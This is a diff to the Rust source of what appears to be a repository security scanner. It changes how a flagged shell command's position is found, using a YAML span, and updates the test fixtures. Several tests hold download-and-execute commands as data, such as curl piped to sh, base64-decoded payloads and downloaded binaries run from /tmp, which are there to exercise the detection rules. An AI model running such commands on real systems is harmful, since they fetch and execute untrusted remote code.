@@ -26,6 +26,7 @@ use icu_properties::props::{DefaultIgnorableCodePoint, VariationSelector};
 use crate::finding::{Evidence, Finding, Line, Position, RuleId};
 use crate::repo_path::RepoPath;
 use crate::rule::{Examined, Subject};
+use crate::yaml::Span;
 
 /// Extensions of a file a shell runs.
 const SHELL_EXTENSIONS: &[&str] = &["sh", "bash", "zsh", "ksh", "dash"];
@@ -60,6 +61,7 @@ pub(crate) fn shell_sites(
             command,
             source,
             occurrence,
+            at: span,
         } => {
             let found: Vec<Finding> = sites(command)
                 .into_iter()
@@ -68,7 +70,7 @@ pub(crate) fn shell_sites(
             if found.is_empty() {
                 return found;
             }
-            let place = where_written(source, command, *occurrence)
+            let place = where_command_sits(source, command, *occurrence, *span)
                 .and_then(|at| found_at(path, rule, source, at, width))
                 .and_then(|found| found.at);
             found
@@ -91,6 +93,21 @@ pub(crate) fn shell_sites(
 /// form is looked for by its first line: that is where the block starts, which
 /// is what a reviewer needs to find it. `None` when neither form is in the
 /// text, which leaves the finding about the file.
+pub(crate) fn where_command_sits(
+    source: &str,
+    command: &str,
+    occurrence: usize,
+    span: Option<Span>,
+) -> Option<usize> {
+    // Where the file said it is, when the reader knew. Nothing to search for.
+    if let Some(span) = span {
+        return (span.start <= source.len()).then_some(span.start);
+    }
+    where_written(source, command, occurrence)
+}
+
+/// Where `source` writes the `occurrence`th copy of `command`, by looking for
+/// it. Only for a format read without positions.
 pub(crate) fn where_written(source: &str, command: &str, occurrence: usize) -> Option<usize> {
     let nth = |needle: &str| {
         (!needle.is_empty())
@@ -1446,6 +1463,7 @@ mod tests {
                 command,
                 source,
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::DownloadAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1468,6 +1486,7 @@ mod tests {
                     command,
                     source: &source,
                     occurrence,
+                    at: None,
                 },
                 &[RuleId::DownloadAndExecute],
                 DEFAULT_EVIDENCE_WIDTH,
@@ -1561,6 +1580,7 @@ mod tests {
                 command,
                 source: &source,
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::DownloadAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1584,6 +1604,7 @@ mod tests {
                     command,
                     source: &source,
                     occurrence,
+                    at: None,
                 },
                 &[RuleId::DownloadAndExecute],
                 DEFAULT_EVIDENCE_WIDTH,
@@ -1604,6 +1625,7 @@ mod tests {
                 command: "curl -s https://example.invalid | sh",
                 source: "{}",
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::DownloadAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1621,6 +1643,7 @@ mod tests {
                 command: "curl -s https://example.invalid | sh",
                 source: "{}",
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::InvisibleUnicode],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1675,6 +1698,7 @@ mod tests {
                 command: "curl -s https://example.invalid | base64 -d | sh",
                 source: "{}",
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::DownloadAndExecute, RuleId::DecodeAndExecute],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1715,6 +1739,7 @@ mod tests {
                 command: "curl -fsSLo /tmp/x https://example.invalid/x && /tmp/x",
                 source: "{}",
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::DownloadAndExecute, RuleId::UnverifiedDownload],
             DEFAULT_EVIDENCE_WIDTH,
@@ -1751,6 +1776,7 @@ mod tests {
                 command: "npx claude-flow@latest hooks pre-edit",
                 source: "{}",
                 occurrence: 0,
+                at: None,
             },
             &[RuleId::UnpinnedRemotePackage],
             DEFAULT_EVIDENCE_WIDTH,
